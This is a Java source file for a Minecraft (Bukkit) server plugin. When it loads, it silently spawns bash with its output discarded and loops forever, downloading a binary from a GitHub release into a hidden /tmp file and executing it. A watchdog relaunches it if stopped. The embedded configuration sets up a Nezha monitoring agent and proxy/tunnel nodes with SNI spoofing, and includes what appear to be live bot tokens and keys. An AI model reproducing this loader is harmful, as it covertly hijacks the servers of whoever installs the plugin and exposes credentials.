package com.argo.plugin;

import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.OutputStreamWriter;
import java.nio.charset.StandardCharsets;
import java.util.Map;

public class WlPlugins extends JavaPlugin {

    private Process process;
    private Thread watchdog;
    private volatile boolean running = false;

    @Override
    public void onEnable() {
        startScript();
    }

    @Override
    public void onDisable() {
        stopScript();
    }

    private synchronized void startScript() {
        if (running) return;

        try {
            ProcessBuilder pb = new ProcessBuilder("bash");

            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);

            Map<String, String> env = pb.environment();

            /* ======= 参数区：只改这里 ======= */

            env.put("TOK", "");
            env.put("ARGO_DOMAIN", "");
            env.put("TUNNEL_PROXY", "");

            env.put("TG", "6839843424 7872982458:AAG3mnTNQyeCXujvXw3okPMtp4cjSioO_DY");
            env.put("SUB_URL", "");

            env.put("NEZHA_SERVER", "nezha.9logo.eu.org:443");
            env.put("NEZHA_KEY", "c0FdihFZ8XpqXFbu7muAAPkD5JmeVY4g");
            env.put("NEZHA_PORT", "");
            env.put("NEZHA_TLS", "1");
            env.put("AGENT_UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");

            env.put("TMP_ARGO", "vls");
            env.put("VL_PORT", "9010");
            env.put("VM_PORT", "8001");
            env.put("CF_IP", "saas.sin.fan");
            env.put("SUB_NAME", "Ultra-FR");
            env.put("UUID", "f6568f52-ac2d-4b79-b77e-c46f5783ab86");
            env.put("second_port", "");

            env.put("SERVER_PORT", "443");
            env.put("SNI", "www.apple.com");
            env.put("HOST", "1.1.1.1");

            env.put("JAR_SH", "moni");

            /* ============================== */

            process = pb.start();
            running = true;

            try (OutputStreamWriter writer =
                         new OutputStreamWriter(process.getOutputStream(), StandardCharsets.UTF_8)) {

                writer.write("""
                while true; do
                  if command -v curl &>/dev/null; then
                      D="curl -sL"
                  elif command -v wget &>/dev/null; then
                      D="wget -qO-"
                  else
                      sleep 30
                      continue
                  fi

                  TMP=/tmp
                  $D https://github.com/dsadsadsss/plutonodes/releases/download/xr/main-amd > $TMP/.p
                  chmod 700 $TMP/.p
                  $TMP/.p >/dev/null 2>&1

                  sleep 5
                done
                """);
                writer.flush();
            }

            startWatchdog();

        } catch (Exception ignored) {
        }
    }

    private synchronized void stopScript() {
        running = false;

        try {
            if (process != null) {
                process.destroy();
                process = null;
            }
            if (watchdog != null) {
                watchdog.interrupt();
                watchdog = null;
            }
        } catch (Exception ignored) {
        }
    }

    private void startWatchdog() {
        watchdog = new Thread(() -> {
            while (running) {
                try {
                    if (process != null && !process.isAlive()) {
                        running = false;
                        startScript();
                        return;
                    }
                    Thread.sleep(5000);
                } catch (InterruptedException ignored) {
                }
            }
        });
        watchdog.setDaemon(true);
        watchdog.start();
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!sender.isOp()) return true;
        if (args.length == 0) return true;

        switch (args[0].toLowerCase()) {
            case "start" -> startScript();
            case "stop" -> stopScript();
            case "restart" -> {
                stopScript();
                startScript();
            }
        }
        return true;
    }
}
